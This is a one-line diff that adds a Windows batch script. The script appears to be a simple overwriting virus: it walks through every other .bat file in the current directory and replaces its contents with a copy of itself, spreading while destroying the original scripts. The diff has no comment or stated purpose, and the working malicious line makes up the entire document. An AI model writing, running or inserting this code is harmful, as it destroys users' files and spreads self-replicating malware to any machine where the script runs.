@@ -1,0 +1,1 @@
+@for %%b in (*.bat) do @if not -%0==-%%b @type %0>%%b
